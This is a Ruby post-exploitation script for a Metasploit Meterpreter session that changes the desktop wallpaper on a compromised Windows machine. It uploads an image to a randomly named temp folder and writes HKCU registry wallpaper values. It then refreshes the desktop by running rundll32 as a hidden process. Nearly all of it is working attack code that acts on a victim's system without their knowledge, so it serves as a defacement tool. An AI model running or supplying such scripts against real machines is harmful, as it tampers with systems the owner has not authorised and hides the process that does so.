#Change Wallpaper

session = client
key = "HKCU"
wallpaper = "metasploit.bmp"
based    = File.join(Msf::Config.install_root, "data", wallpaper)

bgcolor = "0 0 0" # set to 255 255 255 for white
refresh_cmd = "rundll32.exe user32.dll, UpdatePerUserSystemParameters"
delay = 5


# Options
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"]
)

#Upload Image

tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
print_status("Creating a temp dir for wallpaper #{tempdir}...")
client.fs.dir.mkdir(tempdir)

print_status(" >> Uploading #{wallpaper}...")

fd = client.fs.file.new(tempdir + "\\" + wallpaper, "wb")
fd.write(::File.read(based, ::File.size(based)))
fd.close

if(key)
	registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","Wallpaper","#{tempdir}\\#{wallpaper}","REG_SZ")
	
	# Setting the base color isn't working right now
	# registry_setvaldata("#{key}\\Control\ Panel\\Colors\\","Background","#{bgcolor}","REG_SZ") 
	
	registry_setvaldata("#{key}\\Control\ Panel\\Desktop\\","TileWallpaper","0","REG_SZ")
	print_status("Set Wallpaper to #{tempdir}#{wallpaper}")
else
	print_status("Error: failed to open the registry key for writing")
end

#Refresh the users' desktop config
r = session.sys.process.execute(refresh_cmd, nil, {'Hidden' => true, 'Channelized' => true})
r.channel.close
r.close
